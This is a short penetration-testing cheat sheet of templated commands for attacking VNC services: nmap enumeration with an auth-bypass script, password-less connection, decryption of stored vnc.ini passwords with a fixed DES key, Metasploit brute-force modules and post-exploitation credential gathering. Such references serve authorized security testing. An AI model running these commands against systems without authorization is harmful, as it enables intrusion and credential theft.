# VNC

% vnc, 5800, 5801, 5900, 5901
#plateform/linux  #target/remote  #protocol/vnc #port/5800 #port/5801 #port/5900 #port/5901

## vnc - nmap enum
#cat/RECON 
```
nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p <port> <ip>
```

## vncviewer - connect to vnc no pass
#cat/ATTACK/CONNECT 
```
vncviewer <ip>::<port>
```

## vncviewer - connect to vnc with password
#cat/ATTACK/CONNECT 
```
vncviewer -password <password.txt> <ip>::<port>
```

## vnc - decrypt vnc.ini password
#cat/UTILS
echo -n <password> | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv

## vnc msf test none auth
#cat/ATTACK/CONNECT 
```
msfconsole -x "use auxiliary/scanner/vnc/vnc_none_auth; set RHOSTS <ip>; set RPORT <port>; run"
```

## vnc - msf test login bf
#cat/ATTACK/BRUTEFORCE-SPRAY 
```
msfconsole -x "use auxiliary/scanner/vnc/vnc_login; set RHOSTS <ip>; set RPORT <port>; set USERNAME <username>; run"
```

## vnc - msf test login bf (2)
#cat/ATTACK/BRUTEFORCE-SPRAY 
```
msfconsole -x "use auxiliary/scanner/vnc/vnc_login; set RHOSTS <ip>; set RPORT <port>; set USER_FILE <users_file>; set PASS_FILE <pass_file>; run"
```

## vnc - post exploit retrieve credentials
#cat/POSTEXPLOIT/CREDS_RECOVER 
```
msfconsole -x "use post/windows/gather/credentials/vnc; set SESSION <session>; run"
```
